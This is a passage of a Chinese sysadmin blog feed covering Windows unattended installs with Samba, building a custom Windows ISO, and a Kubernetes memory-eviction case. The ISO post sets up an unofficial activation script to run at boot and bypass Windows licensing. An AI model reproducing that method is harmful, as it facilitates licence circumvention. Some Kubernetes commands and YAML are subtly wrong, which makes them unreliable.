&lt;Description&gt;AnJia&lt;/Description&gt;<br>                        &lt;DisplayName&gt;AnJia&lt;/DisplayName&gt;<br>                        &lt;Group&gt;Administrators&lt;/Group&gt;<br>                        &lt;Name&gt;AnJia&lt;/Name&gt;<br>                    &lt;/LocalAccount&gt;<br>                &lt;/LocalAccounts&gt;<br>            &lt;/UserAccounts&gt;<br>            &lt;RegisteredOrganization&gt;AnJia&lt;/RegisteredOrganization&gt;<br>            &lt;RegisteredOwner&gt;AnJia&lt;/RegisteredOwner&gt;<br>            &lt;DisableAutoDaylightTimeSet&gt;<span class="hljs-literal">false</span>&lt;/DisableAutoDaylightTimeSet&gt;<br>            &lt;FirstLogonCommands&gt;<br>                &lt;SynchronousCommand wcm:action=<span class="hljs-string">&quot;add&quot;</span>&gt;<br>                    &lt;Description&gt;Control Panel View&lt;/Description&gt;<br>                    &lt;Order&gt;1&lt;/Order&gt;<br>                    &lt;CommandLine&gt;reg add <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ControlPanel&quot;</span> /v StartupPage /t REG_DWORD /d 1 /f&lt;/CommandLine&gt;<br>                    &lt;RequiresUserInput&gt;<span class="hljs-literal">true</span>&lt;/RequiresUserInput&gt;<br>                &lt;/SynchronousCommand&gt;<br>                &lt;SynchronousCommand wcm:action=<span class="hljs-string">&quot;add&quot;</span>&gt;<br>                    &lt;Order&gt;2&lt;/Order&gt;<br>                    &lt;Description&gt;Control Panel Icon Size&lt;/Description&gt;<br>                    &lt;RequiresUserInput&gt;<span class="hljs-literal">false</span>&lt;/RequiresUserInput&gt;<br>                    &lt;CommandLine&gt;reg add <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ControlPanel&quot;</span> /v AllItemsIconView /t REG_DWORD /d 0 /f&lt;/CommandLine&gt;<br>                &lt;/SynchronousCommand&gt;<br>                &lt;SynchronousCommand wcm:action=<span class="hljs-string">&quot;add&quot;</span>&gt;<br>                    &lt;Order&gt;3&lt;/Order&gt;<br>                    &lt;RequiresUserInput&gt;<span class="hljs-literal">false</span>&lt;/RequiresUserInput&gt;<br>                    &lt;CommandLine&gt;cmd /C wmic useraccount <span class="hljs-built_in">where</span> name=<span class="hljs-string">&quot;AnJia&quot;</span> <span class="hljs-built_in">set</span> PasswordExpires=<span class="hljs-literal">false</span>&lt;/CommandLine&gt;<br>                    &lt;Description&gt;Password Never Expires&lt;/Description&gt;<br>                &lt;/SynchronousCommand&gt;<br>            &lt;/FirstLogonCommands&gt;<br>            &lt;TimeZone&gt;China Standard Time&lt;/TimeZone&gt;<br>        &lt;/component&gt;<br>    &lt;/settings&gt;<br>&lt;/unattend&gt;<br></code></pre></td></tr></table></figure><h2 id="七、配置-samba"><a href="#七、配置-samba" class="headerlink" title="七、配置 samba"></a>七、配置 samba</h2><h4 id="安装-samba"><a href="#安装-samba" class="headerlink" title="安装 samba"></a>安装 samba</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum install samba -y<br></code></pre></td></tr></table></figure><h4 id="修改-smb-config"><a href="#修改-smb-config" class="headerlink" title="修改 smb config"></a>修改 smb config</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost ~]# vi /etc/samba/smb.conf<br><br><span class="hljs-comment"># /etc/samba/smb.conf</span><br>[global]<br><span class="hljs-built_in">log</span> file = /var/log/samba/log.%m<br>max <span class="hljs-built_in">log</span> size = 5000<br>security = user<br>guest account = nobody<br>map to guest = Bad User<br>load printers = <span class="hljs-built_in">yes</span><br>cups options = raw<br><br>[share]<br>comment = share directory目录<br>path = /smb/<br>directory mask = 0755<br>create mask = 0755<br>guest ok=<span class="hljs-built_in">yes</span><br>writable=<span class="hljs-built_in">yes</span><br></code></pre></td></tr></table></figure><h4 id="启动-smb-服务"><a href="#启动-smb-服务" class="headerlink" title="启动 smb 服务"></a>启动 smb 服务</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost ~]# service smb start<br>[root@localhost ~]# systemctl <span class="hljs-built_in">enable</span> smb<br><br></code></pre></td></tr></table></figure><h4 id="挂载-win10-系统"><a href="#挂载-win10-系统" class="headerlink" title="挂载 win10 系统"></a>挂载 win10 系统</h4><p>通过 winscp 等软件将 cn_windows_10_business_edition_version_1809_updated_sept_2018_x64_dvd_84ac403f.iso 上传到 cobbler 服务器上,并将创建的应答文件，上传到 cobbler <code>/smb/win/win10_x64_bios_auto.xml</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost ~]# <span class="hljs-built_in">mkdir</span> -p /smb/win<br>[root@localhost ~]# mount -o loop,ro zh-cn_windows_10_enterprise_ltsc_2021_x64_dvd_033b7312.iso /mnt/<br>[root@localhost ~]# <span class="hljs-built_in">cp</span> -r /mnt/* /smb/win<br>[root@localhost ~]# umount /mnt/<br></code></pre></td></tr></table></figure><h2 id="八、装-Windows10"><a href="#八、装-Windows10" class="headerlink" title="八、装 Windows10"></a>八、装 Windows10</h2><p>从 vmware 创建一台内存 4G，cpu2 核，磁盘 60G 的空盘，win10 虚拟机，然后开机。记得选 BIOS，别选 UEFI。<br><img src="https://gitee.com/ljh00928/csdn/raw/master/img/6e56c329fdea4466add490819b39036e.png" alt="在这里插入图片描述"></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/3b43708c6eab44819bbcb57010aa3f81.png" alt="在这里插入图片描述"></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/4516113a6b4347578738dae115e4a254.png" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>封装一个专属自己的Windows 系统</title>
    <link href="/2025/04/16/%E5%B0%81%E8%A3%85%E4%B8%80%E4%B8%AA%E4%B8%93%E5%B1%9E%E8%87%AA%E5%B7%B1%E7%9A%84Windows-%E7%B3%BB%E7%BB%9F/"/>
    <url>/2025/04/16/%E5%B0%81%E8%A3%85%E4%B8%80%E4%B8%AA%E4%B8%93%E5%B1%9E%E8%87%AA%E5%B7%B1%E7%9A%84Windows-%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<p>​     因为我们公司属于零售行业，每次有新的门店开店，我们都需要安装大量我们自己软件和打印机驱动等，为了简化这种繁琐的工作和统一化管理，我们选择封装自己的iso镜像。插入u盘，即可安装我们自定义的iso镜像，并实现开机自动激活操作系统。废话不多说，直接上教程。本次以vmware虚拟机为案例，实体机操作也大差不差。</p><h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><ul><li>准备干净系统</li><li>加入需要的软件</li><li>实现开机自动激活Windows</li><li>dism生成install.wim文件</li><li>anyburn替换install.wim文件</li><li>anyburn生成新的iso镜像</li><li>烧录镜像到u盘</li></ul><h1 id="一、准备Windows系统"><a href="#一、准备Windows系统" class="headerlink" title="一、准备Windows系统"></a><strong>一、准备Windows系统</strong></h1><p>1.虚拟机添加硬盘</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/44500211ea6b406e89329a537e0479ac.png" alt="img"></p><p>2.Windows添加磁盘</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/4e908b5765384ef6a77cdcb1b5c24dd0.png" alt="img"></p><p>3.查看卷 </p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/8f0680eb1ab14ce8ad7a07706026567e.png" alt="img"></p><p>4.加入自己需要封装的软件 </p><p>5.关机，按F2进入biso，修改启动项CD-ROM为第一启动项【实体机修改UEFI为U盘启动或者直接进PE界面操作】</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/21ecbdf8e10b4317b5eb4d047bed1b5c.png" alt="img"></p><p> 6.按照以下步骤新增启动文件，也可以选择进入PE界面制作制作.wim启动文件。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/71279447b14f40a18dbb6c4bd9359c9c.png" alt="img"></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/34b638cf3c0743b0aa52d169981da9ab.png" alt="img"></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/d3db2fcbcf4b4e8a86821c9dacb8866b.png" alt="img"></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/05ce4b65f54449709a99756f42382746.png" alt="img"></p><p>7.使用dism生成install.wim文件</p><p>这里系统盘是E盘</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/a0d638875ef04f4a8930c20c176aba0d.png" alt="img"></p><p> 8.生成.win文件</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">dism <span class="hljs-string">/capture-image</span> <span class="hljs-string">/imagefile</span><span class="hljs-function">:D</span>:\install.wim <span class="hljs-string">/capturedir</span><span class="hljs-function">:E</span>:\ <span class="hljs-string">/Name</span><span class="hljs-function">:Windows10_kezhihua</span><br></code></pre></td></tr></table></figure><ul><li>**<code>dism</code>**：调用 DISM 工具。</li><li>**<code>/capture-image</code>**：指定要捕获一个映像文件（<code>install.wim</code>）。</li><li>**<code>/imagefile:D:\install.wim</code>**：指定捕获的映像文件的保存路径和名称（在此示例中，保存到 <code>D:</code> 驱动器的 <code>install.wim</code> 文件中）。</li><li>**<code>/capturedir:E:\</code>**：指定要捕获的源目录。<code>E:</code> 是源系统所在的驱动器或分区。</li><li>**<code>/Name:Windows10_kezhihua</code>**：给捕获的映像文件指定一个名称（此例中，名称为 <code>Windows10_kezhihua</code>）。</li></ul><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/aee6e64b9d774947bb7515da2fb82507.png" alt="img"></p><p> 9.关闭命令行界面，点击继续</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/82a34ec080024db4848790c2a329a0ff.png" alt="img"><br>10.查看生成的install.wim文件</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/5af42ac11a6b4fefbb7b686b2a540690.png" alt="img"></p><h1 id="二、实现Windows开机永久激活"><a href="#二、实现Windows开机永久激活" class="headerlink" title="二、实现Windows开机永久激活"></a><strong>二、实现Windows开机永久激活</strong></h1><p>使用数字许可证，加入Windows定时任务，开机执行。执行完成之后再自删。大概就是这个思路</p><p>参考地址：</p><p><a href="https://github.com/TGSAN/CMWTAT_Digital_Edition/issues/81">https://github.com/TGSAN/CMWTAT_Digital_Edition/issues/81</a></p><p>直接使用脚本无法实现免交互自动激活，需要手动输入1</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/image-20250416172651905.png" alt="image-20250416172651905"></p><p>修改脚本内容，实现免交互自动激活</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/image-20250416172710159.png" alt="image-20250416172710159"></p><p>使用bat脚本开机自动激活</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bat">@<span class="hljs-built_in">echo</span> off<br>:: 设置文件路径<br><span class="hljs-built_in">set</span> &quot;activation_script=C:\Microsoft-Activation-Scripts-master\MAS\Separate-Files-Version\Activators\HWID_Activation.<span class="hljs-built_in">cmd</span>&quot;<br><br>:: 检查文件是否存在<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">exist</span> &quot;<span class="hljs-variable">%activation_script%</span>&quot; (<br>    <span class="hljs-built_in">echo</span> Running HWID Activation script...<br>    :: 执行 HWID_Activation.<span class="hljs-built_in">cmd</span> 文件<br>    <span class="hljs-keyword">call</span> &quot;<span class="hljs-variable">%activation_script%</span>&quot;<br>) <span class="hljs-keyword">else</span> (<br>    <span class="hljs-built_in">echo</span> Error: HWID_Activation.<span class="hljs-built_in">cmd</span> file <span class="hljs-keyword">not</span> found!<br>)<br><br>:: 等待用户按键后退出<br><span class="hljs-built_in">pause</span><br></code></pre></td></tr></table></figure><p>加入Windows任务计划</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/image-20250416172756740.png" alt="image-20250416172756740"></p><p>创建基本任务</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/image-20250416172809175.png" alt="image-20250416172809175"></p><p>创建任务名称</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/image-20250416172821507.png" alt="image-20250416172821507"></p><p>选择计算机启动时</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/image-20250416172838445.png" alt="image-20250416172838445"></p><p>添加上面所写bat脚本路径</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/image-20250416172849228.png" alt="image-20250416172849228"></p><p>完成</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/image-20250416172902047.png" alt="image-20250416172902047"></p><p>因为脚本需要联网激活。所有更改计算机属性。选择联网时启动</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/image-20250416172915961.png" alt="image-20250416172915961"></p><p>这样就实现了开机自动永久激活Windows操作系统</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/image-20250416172929292.png" alt="image-20250416172929292"></p><h1 id="三、编辑iso镜像"><a href="#三、编辑iso镜像" class="headerlink" title="三、编辑iso镜像"></a><strong>三、编辑iso镜像</strong></h1><p>这里我们使用anyburn工具，将生成的install.wim加入镜像里面</p><p>anyburn地址：<a href="https://www.anyburn.com/download.php">Download AnyBurn</a></p><p>编辑镜像</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/d249d2303afa4beca3337f6a12e8b51c.png" alt="img"></p><p>在sources目录中添加install.wim（有些Windows官方镜像中包含install.esd文件，需要删除这个文件）</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/343bbd5335ce419a8d79219d26b3db70.png" alt="img"></p><p>生成镜像</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/e67d15ab6f2549be85af906a9c6d2194.png" alt="img"></p><h1 id="四、烧录镜像"><a href="#四、烧录镜像" class="headerlink" title="四、烧录镜像"></a><strong>四、烧录镜像</strong></h1><p>地址：<a href="https://rufus.ie/en/">Rufus - Create bootable USB drives the easy way</a></p><p>使用rufus烧录镜像，大于4G需要使用NTFS文件格式</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/d2008ae8a7f7452a91418a1812d40ab8.png" alt="img"></p><p>实际工作中可以配合Windows的WDS服务,这个需要解决DHCP中继问题，实现远程一站式部署。</p><p>还可以使用Cobbler+kickstart配合，也可以实现全自动一站式远程装机，感兴趣小伙伴可以参考我这篇博文：<a href="https://blog.csdn.net/m0_69326428/article/details/144848007">Cobbler+kickstart实现批量全自动装机_cobbler批量安装-CSDN博客</a></p>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>k8s故障案例</title>
    <link href="/2025/04/16/k8s%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/"/>
    <url>/2025/04/16/k8s%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="一、问题现象与背景"><a href="#一、问题现象与背景" class="headerlink" title="一、问题现象与背景"></a><strong>一、问题现象与背景</strong></h1><p>某电商平台生产环境的Kubernetes集群在促销活动期间突发大规模Pod驱逐，具体表现如下：</p><ol><li><p><strong>Pod频繁重启</strong>：超过30%的Pod进入<code>Evicted</code>状态，核心服务（如订单支付、购物车）的Pod被反复驱逐。</p></li><li><p><strong>节点资源耗尽</strong>：多个Worker节点的内存使用率超过95%，kubelet日志持续输出<code>MemoryPressure</code>警告。</p></li><li><p><strong>监控告警</strong>：<br>   Prometheus触发<code>node_memory_available_bytes &lt; 10%</code>告警。<br>   Grafana面板显示部分节点的<code>kubelet_evictions</code>指标飙升。</p></li><li><p><strong>业务影响</strong>：用户支付失败率从0.1%上升至15%，直接影响营收。</p></li></ol><h1 id="二、问题根因分析"><a href="#二、问题根因分析" class="headerlink" title="二、问题根因分析"></a><strong>二、问题根因分析</strong></h1><h5 id="1-初步排查：节点与Pod状态"><a href="#1-初步排查：节点与Pod状态" class="headerlink" title="1. 初步排查：节点与Pod状态"></a><strong>1. 初步排查：节点与Pod状态</strong></h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看节点资源使用情况（按内存排序）</span><br>kubectl top nodes --sort-by=memory<br><br><span class="hljs-comment"># 输出示例：</span><br>NAME           CPU(cores)  CPU%   MEMORY(bytes)  MEMORY%<br>worker-node-1  5800m       72%    6143Mi         98%<br>worker-node-2  4200m       52%    5892Mi         95%<br>worker-node-3  3800m       47%    4321Mi         70%<br><br><span class="hljs-comment"># 检查被驱逐的Pod</span><br>kubectl get pods -A -o wide | grep Evicted | <span class="hljs-built_in">wc</span> -l  <span class="hljs-comment"># 输出：47</span><br><br><span class="hljs-comment"># 查看某个被驱逐Pod的详细事件</span><br>kubectl describe pod payment-service-abcde -n production<br></code></pre></td></tr></table></figure><p><strong>关键日志</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Events:<br>  Type     Reason     Age   From               Message<br>  ----     ------     ----  ----               -------<br>  Warning  Evicted    2m    kubelet            The node was low on resource: memory.<br>  Normal   Killing    2m    kubelet            Stopping container payment-service<br></code></pre></td></tr></table></figure><p><strong>结论</strong>：节点内存不足触发kubelet的主动驱逐机制。</p><h5 id="2-深入定位：资源消耗来源"><a href="#2-深入定位：资源消耗来源" class="headerlink" title="2. 深入定位：资源消耗来源"></a><strong>2. 深入定位：资源消耗来源</strong></h5><p><strong>步骤1：识别高内存消耗Pod</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 按内存使用量排序所有Pod</span><br>kubectl top pods -A --sort-by=memory --use-protocol-buffers<br><br><span class="hljs-comment"># 输出示例：</span><br>NAMESPACE    POD_NAME                     MEMORY(Mi)<br>production   recommendation-service-xyz   1024<br>production   payment-service-abc          896<br>logging      fluentd-7k8jh                512<br></code></pre></td></tr></table></figure><p><strong>发现</strong>：<code>recommendation-service</code>的Pod内存占用异常高。</p><p><strong>步骤2：检查Pod资源限制配置</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl get pod recommendation-service-xyz -n production -o yaml | grep -A 5 resources<br><br><span class="hljs-comment"># 输出示例：</span><br>resources:<br>  requests:<br>    cpu: <span class="hljs-string">&quot;500m&quot;</span><br>  limits:<br>    cpu: <span class="hljs-string">&quot;1000m&quot;</span><br></code></pre></td></tr></table></figure><p><strong>问题</strong>：该Pod未设置内存限制（<code>limits.memory</code>缺失），导致内存泄漏时无约束。</p><p><strong>步骤3：分析容器内存使用</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 进入节点查看容器级内存占用（需SSH登录节点）</span><br>docker stats --format <span class="hljs-string">&quot;table &#123;&#123;.Container&#125;&#125;\t&#123;&#123;.Name&#125;&#125;\t&#123;&#123;.MemUsage&#125;&#125;&quot;</span><br><br><span class="hljs-comment"># 输出示例：</span><br>CONTAINER   NAME                      MEM USAGE<br>a1b2c3d4    recommendation-service    1.2GiB / 1.2GiB<br></code></pre></td></tr></table></figure><p><strong>发现</strong>：容器内存占用已突破1GiB，但未配置<code>limits.memory</code>，导致节点内存耗尽。</p><h1 id="三、紧急处理措施"><a href="#三、紧急处理措施" class="headerlink" title="三、紧急处理措施"></a><strong>三、紧急处理措施</strong></h1><h5 id="1-快速扩容与负载分流"><a href="#1-快速扩容与负载分流" class="headerlink" title="1. 快速扩容与负载分流"></a><strong>1. 快速扩容与负载分流</strong></h5><ul><li><strong>横向扩展节点</strong>：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用Cluster Autoscaler自动扩容（假设配置了节点组）</span><br>kubectl scale deployment cluster-autoscaler --replicas=3 -n kube-system<br></code></pre></td></tr></table></figure><p>• <strong>临时调整Pod副本数</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 减少非核心服务副本数，释放资源</span><br>kubectl scale deployment batch-job-processor --replicas=0 -n background<br><br><span class="hljs-comment"># 增加核心服务副本数，分散负载</span><br>kubectl scale deployment payment-service --replicas=10 -n production<br></code></pre></td></tr></table></figure><h5 id="2-手动驱逐问题Pod"><a href="#2-手动驱逐问题Pod" class="headerlink" title="2. 手动驱逐问题Pod"></a><strong>2. 手动驱逐问题Pod</strong></h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 强制删除高内存占用的Pod（触发重新调度）</span><br>kubectl delete pod recommendation-service-xyz -n production --force --grace-period=0<br><br><span class="hljs-comment"># 观察Pod重建后的内存使用</span><br>watch -n 1 <span class="hljs-string">&quot;kubectl top pods -n production | grep recommendation-service&quot;</span><br></code></pre></td></tr></table></figure><h5 id="3-动态调整kubelet驱逐阈值"><a href="#3-动态调整kubelet驱逐阈值" class="headerlink" title="3. 动态调整kubelet驱逐阈值"></a><strong>3. 动态调整kubelet驱逐阈值</strong></h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 临时修改kubelet配置（避免更多Pod被驱逐）</span><br><span class="hljs-built_in">sudo</span> vi /etc/kubernetes/kubelet.conf<br><span class="hljs-comment"># 添加参数：</span><br>evictionHard:<br>  memory.available: <span class="hljs-string">&quot;10%&quot;</span><br>  nodefs.available: <span class="hljs-string">&quot;5%&quot;</span><br><br><span class="hljs-comment"># 重启kubelet</span><br><span class="hljs-built_in">sudo</span> systemctl restart kubelet<br></code></pre></td></tr></table></figure><h1 id="四、根因修复与长期优化"><a href="#四、根因修复与长期优化" class="headerlink" title="四、根因修复与长期优化"></a><strong>四、根因修复与长期优化</strong></h1><h5 id="1-资源配额规范化"><a href="#1-资源配额规范化" class="headerlink" title="1. 资源配额规范化"></a><strong>1. 资源配额规范化</strong></h5><ul><li><strong>为所有Pod添加内存限制</strong>：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># deployment.yaml示例</span><br>apiVersion: apps/v1<br>kind: Deployment<br>metadata:<br>  name: recommendation-service<br>spec:<br>  template:<br>    spec:<br>      containers:<br>      - name: app<br>        resources:<br>          requests:<br>            memory: <span class="hljs-string">&quot;512Mi&quot;</span><br>            cpu: <span class="hljs-string">&quot;500m&quot;</span><br>          limits:<br>            memory: <span class="hljs-string">&quot;1024Mi&quot;</span>  <span class="hljs-comment"># 硬性限制内存上限</span><br>            cpu: <span class="hljs-string">&quot;2000m</span><br></code></pre></td></tr></table></figure><p>• <strong>启用命名空间级ResourceQuota</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">apiVersion: v1<br>kind: ResourceQuota<br>metadata:<br>  name: production-quota<br>  namespace: production<br>spec:<br>  hard:<br>    requests.memory: <span class="hljs-string">&quot;100Gi&quot;</span><br>    limits.memory: <span class="hljs-string">&quot;200Gi&quot;</span><br>    pods: <span class="hljs-string">&quot;200&quot;</span><br></code></pre></td></tr></table></figure><h5 id="2-自动化弹性伸缩"><a href="#2-自动化弹性伸缩" class="headerlink" title="2. 自动化弹性伸缩"></a><strong>2. 自动化弹性伸缩</strong></h5><ul><li><strong>配置HPA（基于内存）</strong>：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl autoscale deployment recommendation-service -n production \<br>  --cpu-percent=70 \<br>  --memory-percent=80 \<br>  --min=3 \<br>  --max=20<br></code></pre></td></tr></table></figure><p>• <strong>使用VPA（垂直扩缩容）</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">apiVersion: autoscaling.k8s.io/v1<br>kind: VerticalPodAutoscaler<br>metadata:<br>  name: recommendation-service-vpa<br>spec:<br>  targetRef:<br>    apiVersion: <span class="hljs-string">&quot;apps/v1&quot;</span><br>    kind: Deployment<br>    name: recommendation-service<br>  updatePolicy:<br>    updateMode: <span class="hljs-string">&quot;Auto&quot;</span><br></code></pre></td></tr></table></figure><h5 id="3-内存泄漏根治"><a href="#3-内存泄漏根治" class="headerlink" title="3. 内存泄漏根治"></a><strong>3. 内存泄漏根治</strong></h5><ul><li><strong>使用pprof进行堆分析</strong>（以Go服务为例）：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">import _ <span class="hljs-string">&quot;net/http/pprof&quot;</span><br><br>func <span class="hljs-function"><span class="hljs-title">main</span></span>() &#123;<br>  go <span class="hljs-function"><span class="hljs-title">func</span></span>() &#123;<br>    log.Println(http.ListenAndServe(<span class="hljs-string">&quot;:6060&quot;</span>, nil))<br>  &#125;()<br>  // 业务代码<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 生成堆内存快照</span><br>go tool pprof http://localhost:6060/debug/pprof/heap<br><br><span class="hljs-comment"># 分析内存分配</span><br>(pprof) top 10<br>(pprof) list leakFunction<br></code></pre></td></tr></table></figure><ul><li><strong>优化代码逻辑</strong>：修复循环引用、缓存未释放等问题。</li></ul><h1 id="五、监控与告警体系升级"><a href="#五、监控与告警体系升级" class="headerlink" title="五、监控与告警体系升级"></a><strong>五、监控与告警体系升级</strong></h1><h5 id="1-Prometheus监控规则"><a href="#1-Prometheus监控规则" class="headerlink" title="1. Prometheus监控规则"></a><strong>1. Prometheus监控规则</strong></h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 